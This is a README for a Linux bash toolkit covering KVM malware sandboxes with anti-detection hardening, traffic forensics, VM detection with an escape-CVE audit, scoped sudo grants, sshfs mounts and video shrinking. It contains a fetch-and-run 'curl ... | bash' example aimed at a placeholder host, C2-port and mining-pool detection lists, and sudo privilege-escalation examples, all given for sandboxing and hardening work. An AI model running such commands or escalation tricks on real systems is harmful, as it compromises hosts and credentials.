# Linux Toolkit

A collection of bash scripts for KVM virtual machine management, malware sandbox forensics, and Linux system diagnostics.

| Script | Description |
|--------|-------------|
| `kvm-manager.sh` | Full KVM VM lifecycle management with snapshots, templates, GPU passthrough, and anti-detection hardening |
| `vm-forensics.sh` | Live traffic monitoring and post-analysis for KVM malware sandboxes |
| `vm-post-setup.sh` | First-boot provisioning for Ubuntu cloud-image VMs (CLI tools, dev envs, web stack, security) |
| `desktop-lag-doctor.sh` | Diagnose and fix micro-lags on Linux desktops |
| `vm-detect.sh` | Red-team VM/hypervisor detection and escape vector auditing |
| `gpu-detective.sh` | Detect, diagnose, and resolve undetected GPU issues on Ubuntu |
| `user-manager.sh` | SSH user provisioning with a shared workspace and narrowly scoped sudo grants |
| `mount-manager.sh` | Mount remote directories (or whole drives) over SSH, for this boot or permanently |
| `video-shrink.sh` | Re-encode a video down to a mobile-sized file (ffmpeg wrapper with a settings wizard) |

## Prerequisites

- Ubuntu / Debian-based system
- Root or sudo access
- Hardware virtualization support (Intel VT-x / AMD-V) for KVM

Install all KVM dependencies automatically:

```bash
sudo ./kvm-manager.sh setup
```

This installs `qemu-kvm`, `libvirt`, `virtinst`, `qemu-utils`, `cloud-image-utils`, enables the libvirt daemon, configures the default network, and optionally sets up GPU passthrough (IOMMU + VFIO) by binding every non-primary GPU — NVIDIA, AMD, or Intel — to `vfio-pci`.

For forensics features, you also need `tcpdump` and `tshark`:

```bash
sudo apt-get install tcpdump tshark wireshark-common
```

---

## kvm-manager.sh

KVM VM manager with fast snapshot rollback, cloud-image provisioning, anti-detection hardening for malware sandboxes, and GPU passthrough for LLM/CUDA workloads.

All commands require `sudo`.

### Quick Start

```bash
# Install KVM stack
sudo ./kvm-manager.sh setup

# Create a cloud-image VM (boots in seconds, no installer)
sudo ./kvm-manager.sh create my-vm --cloud-image

# SSH into it
sudo ./kvm-manager.sh ssh my-vm
```

### Command Reference

#### VM Lifecycle

```
create <name> [options]       Create a new VM
  --cloud-image                 Ubuntu cloud image (boots in seconds, no installer)
  --iso <path>                  Install from ISO (server ISO, serial console)
  --template <vm>               Clone from existing VM/template
  --cpu <N>                     vCPU count (default: 2)
  --ram <size>                  RAM size, e.g. 2G, 512M (default: 2048M)
  --disk <size>                 Disk size, e.g. 20G, 1T (default: 20G)
  --stealth                     Apply anti-detection hardening (malware analysis)
  --gpu [selector]              Pass through host GPU(s) via VFIO (requires setup first).
                                selector = index, PCI addr, or comma-list (see gpu-list);
                                omit to pick the first free GPU
  --post-setup [path]           Run post-setup script after first boot
delete <name> [--force]       Delete VM and all its storage
list                          List all VMs with status
```

#### Templates

```
template-create <vm>          Mark a VM as a reusable template
template-list                 List available templates
clone <source> <new-name>     Clone a VM
```

#### Snapshots

```
snap <vm> <snapshot-name>         Create a snapshot
rollback <vm> <snapshot-name>     Revert to a snapshot (sub-second)
snap-list <vm>                    List snapshots for a VM
snap-delete <vm> <snapshot-name>  Delete a snapshot
```

#### Anti-Detection (Malware Sandbox Hardening)

```
harden <vm> [options]         Apply anti-detection hardening to a shut-off VM
  --profile <N>                 Hardware profile: 0=Dell, 1=Lenovo, 2=HP (default: random)
  --verify                      Verify all hardening changes were applied
```

Stealth mode spoofs SMBIOS (manufacturer, product, BIOS), generates realistic serial numbers, randomizes MAC addresses using real OUI prefixes, and removes KVM/QEMU identifiers. Use `--stealth` on create or `harden` on an existing VM.

#### GPU Passthrough

```
gpu-status                    Check GPU passthrough readiness (IOMMU, VFIO, driver)
gpu-list                      List all GPUs with index, driver, and free/assigned state
gpu-attach <vm> <selector>    Dedicate GPU(s) to a shut-off VM (index / PCI / comma-list)
gpu-detach <vm> <selector>    Remove GPU(s) from a shut-off VM
```

Detection is vendor-agnostic (NVIDIA / AMD / Intel). During `setup`, every GPU **except the host's
primary (boot_vga) one** is bound to `vfio-pci`; a reboot is required after initial setup. On a
multi-GPU host each GPU can be dedicated to a different VM, or several GPUs to one VM
(`--gpu 2,3`). Use `gpu-list` to see which GPUs are free vs already assigned:

```
IDX  PCI          MODEL                    GROUP  DRIVER      STATE        ASSIGNED
0    01:00.0      NVIDIA RTX 4090          14     vfio-pci    vfio-ready   free
1    02:00.0      NVIDIA RTX 4090          15     vfio-pci    vfio-ready   llm-vm
2    00:02.0      Intel UHD Graphics       0      i915        primary      free
```

> **Note:** GPU passthrough works best with the `q35` machine type (the default for `--gpu` creates).
> The guest NVIDIA driver + CUDA toolkit is installed automatically by `vm-post-setup.sh` when the
> passthrough GPU is NVIDIA; AMD/Intel guest drivers must be installed manually. Two *identical-model*
> GPUs share one PCI ID and cannot be split (one host / one VM) by `setup` alone.

#### Provisioning

```
post-setup <vm> [script-path]   Run post-setup script on existing VM via SSH
analyze <vm> [forensics-args]   Run vm-forensics analysis on a VM
```

#### Monitoring & Access

```
status <vm>                   Detailed VM information
monitor                       Live overview of all VMs (watch mode)
console <vm>                  Attach to VM serial console
ssh <vm> [ssh-args...]        SSH into VM (auto-detects IP)
```

#### Power

```
start <vm>                    Start a VM
stop <vm> [--force]           Graceful shutdown (--force to kill)
restart <vm>                  Reboot a VM
autostart <vm> [on|off]       Toggle VM autostart on host boot
```

### Usage Examples

**Fully provisioned stealth sandbox:**

```bash
# Create a hardened VM with all dev tools pre-installed
sudo ./kvm-manager.sh create sandbox --cloud-image --cpu 4 --ram 8G --stealth --post-setup

# Snapshot the clean state before running anything suspicious
sudo ./kvm-manager.sh snap sandbox clean

# Run suspicious code inside the VM
sudo ./kvm-manager.sh ssh sandbox -- 'curl -sL http://sketchy-site.example | bash'

# Roll back to clean state instantly
sudo ./kvm-manager.sh rollback sandbox clean
```

**GPU passthrough for LLM workloads:**

```bash
sudo ./kvm-manager.sh setup                  # binds non-primary GPUs to VFIO (reboot after)
sudo ./kvm-manager.sh gpu-list               # see which GPUs are free vs assigned
sudo ./kvm-manager.sh create llm-vm --cloud-image --cpu 8 --ram 32G --disk 100G --gpu 0 --post-setup
# multi-GPU: dedicate different GPUs to different VMs
sudo ./kvm-manager.sh create vm-b --cloud-image --ram 32G --gpu 2,3
```

**Template-based workflow:**

```bash
# Create and configure a base VM
sudo ./kvm-manager.sh create base --cloud-image --post-setup
# ... customize as needed ...
sudo ./kvm-manager.sh stop base
sudo ./kvm-manager.sh template-create base

# Spin up clones instantly
sudo ./kvm-manager.sh clone base worker-1
sudo ./kvm-manager.sh clone base worker-2
```

### Best Practices

- **Always snapshot before testing** — `snap` + `rollback` gives you sub-second reverts, so create a `clean` snapshot right after provisioning.
- **Use `--stealth` for malware analysis** — malware often fingerprints VM environments. Stealth mode mimics real Dell/Lenovo/HP hardware.
- **Use `--cloud-image` over `--iso`** — cloud images boot in seconds with no installer needed. Combine with `--post-setup` for a fully provisioned VM in one command.
- **Templates for repetitive work** — create a template once, then `clone` for each new task.
- **GPU passthrough needs a reboot** — after `setup`, reboot the host so IOMMU and VFIO take effect. Check with `gpu-status`.

---

## vm-forensics.sh

Live traffic monitoring and post-capture analysis for KVM malware sandboxes. Flags suspicious ports, DGA-like domains, known mining pools, and shady TLDs with color-coded output.

All commands require `sudo` (for packet capture).

### Quick Start

```bash
# Start capturing traffic from a running VM
sudo ./vm-forensics.sh capture sandbox

# ... do suspicious things inside the VM ...

# Stop capture
sudo ./vm-forensics.sh stop sandbox

# Analyze the captured traffic
sudo ./vm-forensics.sh analyze ./forensics/sandbox/<session>/capture.pcap
```

### Command Reference

#### Live Monitoring

```
capture <vm>          Start background packet capture (pcap file)
live <vm>             Live color-coded traffic display (Ctrl+C to stop)
watch-all <vm>        Combined: background capture + live display
stop [vm]             Stop capture processes (all if no vm specified)
```

#### Analysis

```
analyze <pcap-file>           Post-analysis of captured traffic
disk-diff <vm> <snapshot>     Compare current disk state vs snapshot (VM must be off)
dump-mem <vm>                 Capture VM memory for Volatility analysis
report <session-dir>          Generate summary report from session data
```

#### Testing

```
simulate <vm>         Deploy and run safe test patterns inside the VM
```

The `simulate` command generates known-bad traffic patterns using non-routable domains and localhost so you can validate your monitoring setup without any real risk.

### What It Detects

| Indicator | Details |
|-----------|---------|
| **Suspicious ports** | 4444, 5555, 8888, 1337, 6666, 9999, 31337, 3389 |
| **Suspicious TLDs** | .xyz, .top, .club, .work, .click, .loan, .gq, .ml, .cf, .tk |
| **Mining pools** | pool.minexmr, xmrpool, monerohash, cryptonight, coinhive, stratum |
| **DGA domains** | Labels >20 chars, all-consonant labels, high digit ratio |

In live mode, suspicious activity is highlighted in **red** (high confidence: C2 ports, DGA, mining) or **yellow** (medium: suspicious TLDs).

### Usage Examples

**Full malware analysis workflow:**

```bash
# 1. Create a hardened sandbox and snapshot clean state
sudo ./kvm-manager.sh create sandbox --cloud-image --stealth
sudo ./kvm-manager.sh snap sandbox clean

# 2. Start monitoring (capture + live display)
sudo ./vm-forensics.sh watch-all sandbox

# 3. In another terminal, run the suspicious payload
sudo ./kvm-manager.sh ssh sandbox -- 'npm install suspicious-package'

# 4. Stop capture (Ctrl+C on watch-all, or from another terminal)
sudo ./vm-forensics.sh stop sandbox

# 5. Analyze captured traffic
sudo ./vm-forensics.sh analyze ./forensics/sandbox/<session>/capture.pcap

# 6. Compare filesystem changes against clean snapshot
sudo ./kvm-manager.sh stop sandbox
sudo ./vm-forensics.sh disk-diff sandbox clean

# 7. Generate a report
sudo ./vm-forensics.sh report ./forensics/sandbox/<session>/

# 8. Roll back and repeat
sudo ./kvm-manager.sh rollback sandbox clean
```

**Validate your setup with simulated traffic:**

```bash
sudo ./vm-forensics.sh capture sandbox
sudo ./vm-forensics.sh simulate sandbox    # generates safe test patterns
sudo ./vm-forensics.sh stop sandbox
sudo ./vm-forensics.sh analyze ./forensics/sandbox/<session>/capture.pcap
```

**Memory forensics:**

```bash
# Dump VM memory while it's running (for Volatility analysis)
sudo ./vm-forensics.sh dump-mem sandbox
# Analyze with: vol.py -f <dump-file> linux.pslist
```

### Best Practices

- **Always snapshot before analysis** — so you can `rollback` to a clean state after.
- **Use `simulate` first** — validates that your capture and analysis pipeline works before running real malware.
- **Use `watch-all` for interactive sessions** — combines background pcap capture with live display. The pcap is saved even if you miss something in the live view.
- **Run `disk-diff` after stopping the VM** — the VM must be shut off for disk comparison. Compare against your clean snapshot to see all filesystem changes.
- **Session directories** are created under `./forensics/<vm-name>/<timestamp>/` — each capture gets its own timestamped directory.

---

## vm-detect.sh

Red-team VM/hypervisor detection tool. Runs **inside a guest** to detect virtualization, identify the hypervisor type, report confidence scores, and audit known escape vectors. Use it to validate your stealth hardening setup.

### Commands

```
scan            Run all 11 detection checks (default)
quick           Fast checks only (skip timing, ACPI, network)
escape-audit    Detect hypervisor + report known escape CVEs
benchmark       RDTSC timing attack with detailed statistics
```

### Options

```
-v, --verbose     Enable verbose/debug output
-q, --quiet       Exit code only (0=physical, 1=VM detected)
    --json        Machine-readable JSON output
```

### Detection Categories

| Check | Method | Signal |
|-------|--------|--------|
| **CPUID** | Hypervisor bit + vendor string (leaf 0x40000000) | High |
| **DMI/SMBIOS** | `/sys/class/dmi/id/*` for QEMU/KVM/VBox/VMware strings | High |
| **PCI Devices** | Virtual PCI vendor IDs (virtio 0x1af4, VMware 0x15ad, VBox 0x80ee) | High |
| **Disk** | Disk model/vendor/serial + virtio block device names | Medium |
| **Processes** | Guest agent processes (qemu-ga, VBoxService) + kernel modules | Medium |
| **Filesystem** | `/sys/hypervisor`, `/dev/virtio-ports`, `qemu_fw_cfg`, etc. | Medium |
| **Timing** | RDTSC: CPUID trap overhead vs NOP baseline (compiled C) | High |
| **MAC Address** | OUI prefix matching against known virtual prefixes | Medium |
| **CPU** | Model string anomalies, hypervisor flag, core count vs model | Medium |
| **ACPI** | DSDT/FACP/DMI binary table signatures (BOCHS, BXPC, QEMU) | High |
| **Network** | Gateway MAC, bridge interfaces, virbr detection | Low |

### Escape Audit

The `escape-audit` command identifies the hypervisor and reports known VM escape CVEs:

- **QEMU/KVM**: VENOM (CVE-2015-3456), USB EHCI (CVE-2020-14364), virtio-net UAF (CVE-2021-3748), QCOW2 escape (CVE-2024-4467), and more
- **VirtualBox**: 3D acceleration escape (CVE-2018-2698), VBoxSVGA heap overflow (CVE-2023-21987)
- **VMware**: DnD heap overflow (CVE-2017-4901), USB EHCI (CVE-2022-31705)
- **Hyper-V**: vmswitch RCE (CVE-2021-28476)

### Usage

```bash
# Full scan inside a VM (needs root for ACPI tables)
sudo ./vm-detect.sh scan

# Quick check — just exit code
./vm-detect.sh quick --quiet && echo "Physical" || echo "Virtual"

# JSON output for automation
sudo ./vm-detect.sh scan --json | jq .

# Identify hypervisor and list escape CVEs
sudo ./vm-detect.sh escape-audit

# Test your stealth hardening
sudo ./kvm-manager.sh create sandbox --cloud-image --stealth
# Copy vm-detect.sh into the VM and run it
sudo ./kvm-manager.sh ssh sandbox -- 'sudo bash /tmp/vm-detect.sh scan'
```

### Best Practices

- **Run on unhardened VMs first** — establishes a baseline of what gets detected before hardening.
- **Run after `kvm-manager.sh harden`** — validates that hardening actually reduced detection surface.
- **Use `--json` for CI/automation** — parse results programmatically to gate deployments.
- **ACPI checks need root** — the timing attack needs `gcc`. Install both for a complete scan.
- **Escape CVEs are informational** — patched hypervisors may not be vulnerable. Always check your QEMU/libvirt version.

---

## vm-post-setup.sh

Automatic first-boot provisioning for Ubuntu cloud-image VMs. Transforms a bare cloud image into a fully equipped development and analysis environment in a single run.

### How to Use

```bash
# Option 1: Automatically during VM creation
sudo ./kvm-manager.sh create my-vm --cloud-image --post-setup

# Option 2: On an existing VM
sudo ./kvm-manager.sh post-setup my-vm

# Option 3: Standalone (run inside the VM)
sudo bash vm-post-setup.sh [--user USERNAME]
```

The script is idempotent — it can be re-run safely. A marker file (`/opt/.post-setup-done`) tracks whether it has already been executed.

### What It Installs (12 Phases)

| Phase | What | Details |
|-------|------|---------|
| **1. System packages** | Core + modern CLI tools | `bat`, `ripgrep`, `fd-find`, `fzf`, `zoxide`, `btop`, `duf`, `git-delta`, `httpie`, `redis-server`, `jq`, build tools |
| **2. Binary installs** | Tools not in apt repos | `eza` (modern ls), `dust` (modern du), `sd` (modern sed), `procs` (modern ps), `starship` (prompt) |
| **3. Shell config** | Aliases + integrations | Aliases all classic commands to modern replacements (`cat`->`bat`, `ls`->`eza`, `grep`->`rg`, `find`->`fd`, `top`->`btop`, etc.), configures zoxide, fzf keybindings, starship prompt |
| **4. Miniconda** | Python env manager | Installed with `auto_activate_base` disabled so it doesn't interfere |
| **5. NVM + Node** | Node.js environment | NVM + Node 22 + PM2 (process manager) + tldr |
| **6. Nginx + SSL** | Reverse proxy + HTTPS | Self-signed certificate (10-year validity, includes VM IP in SAN), HTTP->HTTPS redirect, optimized config with gzip + keepalive |
| **7. System dashboard** | Web-based status page | Cybersecurity-themed HTML dashboard at `https://<vm-ip>/` showing system stats, resource usage, security status. Auto-refreshes every 60s via systemd timer |
| **8. UFW firewall** | Zero-trust firewall | Denies all incoming by default, allows SSH (rate-limited), HTTP, HTTPS, 8080 |
| **9. earlyoom** | Userspace OOM killer | Replaces `systemd-oomd`. Triggers at 5% free RAM, kills dev/build processes first, protects sshd/nginx/redis |
| **10. sysctl tuning** | Kernel optimizations | SYN flood protection, TCP BBR congestion control, connection tuning, inotify limits, swap minimization, martian packet logging |
| **11. MOTD** | Login banner | Cybersecurity-themed terminal banner with live system stats (memory, disk, network, security threat level) |
| **12. NVIDIA GPU + CUDA** | GPU driver (conditional) | Only runs for an **NVIDIA** GPU — detected via `lspci` or a passthrough marker with `GPU_VENDOR=nvidia`. Installs driver + CUDA toolkit + adds to PATH. AMD/Intel passthrough GPUs are skipped (install vendor drivers manually) |

### Shell Aliases After Setup

| You type | Runs |
|----------|------|
| `cat` | `bat` (syntax highlighting) |
| `ls` | `eza` |
| `ll` | `eza -alh --git` |
| `lt` | `eza --tree --level=2` |
| `grep` | `ripgrep` |
| `find` | `fd` |
| `top` | `btop` |
| `du` | `dust` |
| `df` | `duf` |
| `diff` | `delta` |
| `ps` | `procs` |

---

## desktop-lag-doctor.sh

Diagnoses and fixes micro-lags on Linux desktops. Checks for common performance issues like compositor problems, I/O bottlenecks, swappiness, and scheduler misconfigurations, then offers interactive fixes with rollback support.

### Commands

```
diagnose        Run all diagnostic checks (prompts to fix interactively)
fix             Apply all safe performance tuning at once
monitor         Live monitoring loop for lag sources
rollback        Restore previous settings from a saved snapshot
```

### Options

```
-d, --dry-run     Show what fix would do without applying
-v, --verbose     Enable verbose/debug output
-q, --quiet       Suppress non-error output
-y, --yes         Auto-confirm all fix prompts
    --json        Machine-readable JSON output
```

### Usage

```bash
# Interactive diagnosis (recommended first run)
sudo ./desktop-lag-doctor.sh diagnose

# Apply all fixes non-interactively
sudo ./desktop-lag-doctor.sh fix --yes

# Preview fixes without applying
sudo ./desktop-lag-doctor.sh fix --dry-run

# Undo previous fixes
sudo ./desktop-lag-doctor.sh rollback
```

---

## gpu-detective.sh

Detects, diagnoses, and resolves undetected GPU issues on Ubuntu. Useful when your GPU isn't showing up, drivers are broken, or you need a full diagnostic report.

### Commands

```
scan            Full hardware scan for all GPUs (default)
drivers         Check and fix driver issues
bios            Inspect UEFI/BIOS-related GPU settings
fix             Attempt automatic resolution of common GPU issues
report          Generate a full diagnostic report file
```

### Options

```
-d, --dry-run     Show what fix would do without applying
-v, --verbose     Enable verbose/debug output
-q, --quiet       Suppress non-error output
-y, --yes         Auto-confirm all fix prompts
    --json        Machine-readable JSON output
```

### Usage

```bash
# Full GPU scan
sudo ./gpu-detective.sh scan

# Check and fix driver issues
sudo ./gpu-detective.sh drivers

# Generate a diagnostic report
sudo ./gpu-detective.sh report

# Auto-fix with dry-run preview
sudo ./gpu-detective.sh fix --dry-run
sudo ./gpu-detective.sh fix --yes
```

---

## user-manager.sh

Creates SSH login users from a supplied public key, generates a random password whose only job is authenticating `sudo`, wires everyone into a shared `/home/shared` workspace, and manages reusable sudo capability-groups — so you can hand someone `sudo nginx -t` without handing them root.

All commands require `sudo`.

### Quick Start

```bash
# One-time host preparation
sudo ./user-manager.sh setup

# Create a user (prompts for their public key, prints a password once)
sudo ./user-manager.sh add alice

# Let alice test and reload nginx — and nothing else
sudo ./user-manager.sh sudo-add web '/usr/sbin/nginx -t'
sudo ./user-manager.sh sudo-add web '/usr/bin/systemctl reload nginx'
sudo ./user-manager.sh sudo-grant web alice

# Confirm it with sudo's own policy engine
sudo ./user-manager.sh verify alice -- /usr/sbin/nginx -t
```

### Command Reference

#### Setup

```
setup [--hidepid] [--service-account]
                              Install sshd, create the shared account and
                              workspace, harden home permissions, write the
                              sshd drop-in
harden-ssh                    Disable password SSH for ALL accounts (asks first)
```

#### Users

```
add <user> [options]          Create a user from a public key
delete <user> [--purge]       Remove a user; --purge also removes their home
passwd <user>                 Generate and print a new sudo password
key <user> [<keyfile>|-]      List keys, or append one ('-' reads a paste)
list [user]                   Show managed users, capabilities and grants
```

#### Sudo capabilities

```
sudo-add <cap> '<abs-path args>' [--force] [--allow-exec]
                              Grant a command to a capability, creating it
                              if needed
sudo-del <cap> ['<abs-path args>']
                              Revoke one command, or delete the capability
sudo-grant  <cap> <user>      Give a user the capability
sudo-revoke <cap> <user>      Take it away
verify <user> [-- cmd args]   Ask sudo whether the user may run something
```

### Options

```
--key-file <path>   Read the public key from a file instead of prompting
--key '<string>'    Pass the public key inline
--purge             delete: also remove the user's home directory
--hidepid           setup: mount /proc with hidepid=2 so users cannot see
                    each other's processes (may upset desktop tooling)
--service-account   setup: create the share owner as a no-login system account
                    (no password, no keys, no dotfiles) — for shares that
                    services run from, where a login would let any member plant
                    a .bashrc that runs as the service
--no-share          add: keep the user out of the shared group (someone from
                    another project on the same host)
--force             sudo-add: grant a bare path (ANY arguments), or skip the
                    confirmation on a caution-tier command
--allow-exec        sudo-add: drop NOEXEC for this capability, letting the
                    granted command spawn child processes

UM_SHARED_USER / UM_SHARED_DIR (environment) select another share, so one
host can carry several: UM_SHARED_USER=shared-dev UM_SHARED_DIR=/home/shared-dev
```

### What confinement this gives you

Users are separated from **each other**, not from the OS. `setup` sets each managed home to `700`, `/home` to `751` (so `ls /home` no longer enumerates accounts), and optionally hides other users' processes. They can still read `/etc`, `/usr` and `/var`.

This is deliberate. An earlier design chrooted each user, but a chroot holding a real toolchain — git, python, compilers — is a container built badly: a second Ubuntu to patch, `/proc` `/sys` `/dev` bind mounts, and `apt` inside the jail. If you need true isolation, use LXD or `systemd-nspawn`; permissions plus a tight sudo allowlist is the honest middle ground.

Dropping the chroot also made the shared workspace trivial: `~/shared` is a plain symlink to `/home/shared`, so there are no bind mounts, no per-user `fstab` lines, and `delete --purge` removes the link rather than the shared data behind it.

### How sudo grants work

One Unix group per capability (`sudogrp-<name>`), one file per capability in `/etc/sudoers.d`. Attach and detach users with `sudo-grant` / `sudo-revoke`.

**Arguments are matched exactly.** `/usr/sbin/nginx -t` permits that invocation and no other — not `nginx -q -t`, not `nginx --test`. Add each accepted form as its own `sudo-add`.

**A command with no arguments permits any arguments.** That is what `sudoers` means by a bare path, and it is usually root: `/usr/sbin/nginx` also permits `sudo nginx -c /tmp/evil.conf`, which loads an attacker-chosen config as root. The script refuses bare paths unless you pass `--force`. To permit a command with no arguments at all, write `'/usr/bin/uptime ""'`.

**Wildcards are refused.** `sudoers` globs match whitespace, so `/bin/cat /var/log/messages*` also permits `cat /var/log/messages /etc/shadow`. A wildcard grant is a bare grant wearing a disguise.

**Grants always require the password**, never `NOPASSWD`, and the credential cache is disabled (`timestamp_timeout=0`). Ubuntu builds sudo with a 15-minute cache, which would otherwise mean one successful call buys fifteen password-free minutes.

Commands are refused in two tiers. Binaries that yield a root shell regardless of arguments — shells, interpreters, editors, pagers, `env`-style wrappers, `find`, `tar`, `git`, `docker`, and write primitives like `tee` and `dd` — are refused outright and `--force` does not override them. Binaries that are only dangerous in their general form — `systemctl`, `ip`, `iptables`, database clients — warn and ask for confirmation, because a pinned invocation like `systemctl reload nginx` is exactly the point.

The script also refuses any binary whose path, or any parent directory, is writable by a non-root user: whoever can write that path chooses what runs as root. On a machine with a conda install, for instance, `python3` resolves under `$HOME` and would be a full escalation.

### Usage Examples

```bash
# Create a user from a key file rather than a paste
sudo ./user-manager.sh add bob --key-file ~/keys/bob.pub

# See everyone, their capabilities, and how many keys they have
sudo ./user-manager.sh list
sudo ./user-manager.sh list alice

# Add a second device key for a user
sudo ./user-manager.sh key alice ~/keys/alice-laptop.pub

# Rotate a forgotten sudo password
sudo ./user-manager.sh passwd alice

# Revoke one command but keep the capability
sudo ./user-manager.sh sudo-del web '/usr/bin/systemctl reload nginx'

# Remove the capability entirely
sudo ./user-manager.sh sudo-del web
```

### Best Practices

**Keep a second root shell open the first time you use this.** — A malformed file in `/etc/sudoers.d` disables `sudo` for everyone on the box. The script validates every generated file in isolation, then re-validates the whole tree and rolls back if anything broke, but a spare `sudo -i` costs nothing.

**Group changes need a new login.** — `sudo` reads the invoking process's kernel group list, so a freshly granted capability does not reach a session that is already open. `sudo -l -U alice` queries the policy directly and will look correct while alice's current shell still fails. The same applies in reverse: `sudo-revoke` does not reach live sessions, which is why it offers to terminate them.

**Prefer a wrapper over a `--force` grant.** — If a command you need is on the refused list, write a small root-owned script in `/usr/local/sbin` that does only the narrow thing, and grant that. It passes the path check, it is reviewable, and it cannot be argued into a shell.

**`--allow-exec` re-opens the escape class.** — By default each capability carries `NOEXEC`, which on Linux is a seccomp filter blocking `execve` from the granted command. If a grant mysteriously stops working, that is the first thing to test — but understand that turning it off lets the command spawn a shell.

**The password is not for SSH.** — Managed accounts are key-only; the sshd drop-in sets `PasswordAuthentication no` scoped to `Match Group sshusers` so existing accounts on the host are untouched. Use `harden-ssh` if you want that globally.

---

## mount-manager.sh

Mounts a directory from another machine onto a local path over SSH (sshfs), either for this boot only or permanently via `/etc/fstab` + systemd automount. Built for the case where an app writes files that belong on a different box: mount the remote directory where the app already writes, and change no application code.

All commands require `sudo`.

### Quick Start

```bash
# One-time prep: sshfs, a root SSH key, the host key, user_allow_other
sudo ./mount-manager.sh setup app@storage:/srv/data

# Mount it permanently, owned by the user your app runs as
sudo ./mount-manager.sh add app@storage:/srv/data /home/user/data --as www-data

# Is it actually alive?
sudo ./mount-manager.sh check /home/user/data
```

### Command Reference

```
setup <user@host>[:/path]     One-time prep: install sshfs, create a root SSH key,
                              trust the host key, enable user_allow_other, verify
                              login (and the remote path, if given)
mount <user@host:/remote> <local>   Mount now. Gone after a reboot.
add   <user@host:/remote> <local>   Mount now and every boot (fstab + automount)
umount <local>                Unmount (survives a dead transport endpoint)
rm     <local>                Unmount and delete the fstab entry
list                          Show managed and live sshfs mounts
check  <local>                Probe a mount: read, write, report round trip
```

### Options (mount / add)

```
--as <user>     Local user the files should appear to belong to. Defaults to the
                owner of the mountpoint directory. Set this to your app's user.
--key <path>    SSH private key (default: /root/.ssh/id_ed25519_mount)
--port <n>      SSH port (default: 22)
--ro            Mount read-only
--private       Drop allow_other — only root may enter the mount
--force         Mount over a non-empty directory, hiding what is in it
```

### A Whole Drive

There is no separate command — name the remote's mountpoint:

```bash
sudo ./mount-manager.sh add backup@storage:/mnt/bigdisk /mnt/bigdisk
```

### What This Is and Is Not Good For

Every file operation is an SSH round trip. Writing generated files, serving static assets, moving archives around: fine. A database file, a git checkout, or anything doing many small random reads and fsyncs on the mount: use a real network filesystem instead.

**There is no cross-client file locking.** Two machines writing the same file corrupt it; `flock()` on the mount only sees local processes.

**`uid=`/`gid=` is client-side cosmetics.** On the remote host the files belong to the SSH user, and that host's permissions are the ones that actually apply.

### Usage Examples

```bash
# Move an app's output directory onto the storage box, no app changes
sudo ./mount-manager.sh setup app@storage:/srv/data
rsync -a --info=progress2 /home/user/data/ app@storage:/srv/data/
rm -rf /home/user/data/*
sudo ./mount-manager.sh add app@storage:/srv/data /home/user/data --as www-data

sudo ./mount-manager.sh list
sudo ./mount-manager.sh check /home/user/data
sudo ./mount-manager.sh rm /home/user/data
```

### Best Practices

**`add` uses an automount, not a plain boot mount.** — The mount happens on first access, so a storage box that is down at boot gives the app an I/O error on its first write instead of hanging this machine's boot for 90 seconds.

**"mounted" is not the same as "working".** — A dead sshfs mount looks identical to a live one until something touches it. That is what `check` is for: it reads, writes, and times both. `list` reports a dead one as `stale`.

**The boot-time key has no passphrase, on purpose.** — systemd mounts this with no tty and no agent to unlock anything. The protection is that the key is root-owned and `0600`.

**Verify the host key fingerprint during `setup`.** — Trust-on-first-use is the one security decision this script makes, so it shows the fingerprints and asks. Accepting the wrong key means every file the app writes goes to whoever answered. Check it on the server itself with `ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub`.

**It refuses to mount over a non-empty directory.** — Mounting hides everything underneath with no warning, and the files stay hidden until the mount goes away. Copy them to the remote first; `--force` is there if you really mean it.

**`/etc/fstab` is validated before it is written** and the previous version is kept at `/etc/fstab.mount-manager.bak`. Unlike a sudoers mistake, a malformed fstab is not discovered until the reboot.

### Self-Check

```bash
./test_mount_manager.sh
```

Covers target parsing, mountpoint validation, option building, and the fstab render/parse/remove round trip. No root, no system changes — every function tested is pure or operates on a temp file.

---

## video-shrink.sh

An ffmpeg wrapper for the one job you keep re-googling the flags for: turning a desktop-sized video into one a phone can actually load. It probes the source, offers the resize options that make sense for that source, **prints the ffmpeg command it assembled**, and runs it.

No root. Needs `ffmpeg` and `ffprobe`:

```bash
sudo apt-get install ffmpeg
```

### Quick Start

```bash
# What am I dealing with
./video-shrink.sh info ~/Downloads/clip.mp4

# Ask me everything, then encode
./video-shrink.sh mobile ~/Downloads/clip.mp4

# No questions — 720p, CRF 26, 128k AAC
./video-shrink.sh mobile ~/Downloads/clip.mp4 --yes
```

A 1920x1080 / 25 fps / 9 Mbit/s / 1:41 clip goes from 113 MB to 17 MB at the defaults, in about 8 seconds.

### Command Reference

```bash
./video-shrink.sh info <file>              # resolution, fps, duration, bitrates, size
./video-shrink.sh mobile <file> [out.mp4]  # the wizard + the encode
./video-shrink.sh help
```

Output defaults to `<name>-mobile-<height>p.mp4` beside the source. An existing output is never overwritten without asking (or `--yes`), and an output path equal to the input is refused outright.

### Options

Anything you pass as a flag is not asked for, so `--yes` plus flags is a fully scriptable encode.

| Option | Meaning |
|--------|---------|
| `--scale <h>` | Target height, e.g. `720`. Never upscales. (default: `720`) |
| `--fps <n>` | Output framerate (default: the source's) |
| `--crf <n>` | Quality, 18-32. Lower is better and bigger. (default: `26` h264, `30` h265) |
| `--target-size <s>` | Hard cap — `25M`, `500k`, `1.5G`. Switches to a 2-pass encode. Overrides `--crf`. |
| `--audio <rate>` | `128k` / `96k` / `64k` / `copy` / `none` (default: `128k`) |
| `--codec h264\|h265` | `h264` plays everywhere; `h265` is ~30% smaller but Firefox and older Android will not touch it. (default: `h264`) |
| `--preset <p>` | x264/x265 preset, `ultrafast` … `veryslow`. Slower = smaller at the same quality. (default: `veryfast`) |
| `-y`, `--yes` | No prompts: take the defaults and encode. |

### Usage Examples

```bash
# Must fit in a 25 MB upload limit
./video-shrink.sh mobile clip.mp4 --target-size 25M --yes

# As small as it goes while still playing on anything
./video-shrink.sh mobile clip.mp4 --scale 480 --fps 24 --crf 30 \
    --audio 64k --preset slow --yes

# Screen recording — no audio, keep it sharp, half the framerate
./video-shrink.sh mobile screencast.mp4 --scale 720 --fps 15 --crf 23 --audio none --yes
```

### What It Does Under the Hood

**CRF by default, target size on demand.** — CRF asks for a quality and lets the size land where it lands, so an easy clip costs fewer bits instead of being padded up to a number. `--target-size` computes the video bitrate from duration, subtracts the audio track and 2% mux overhead, and runs two passes. Ask for 10 MB and you get 9.8 MB, not 10.4 MB.

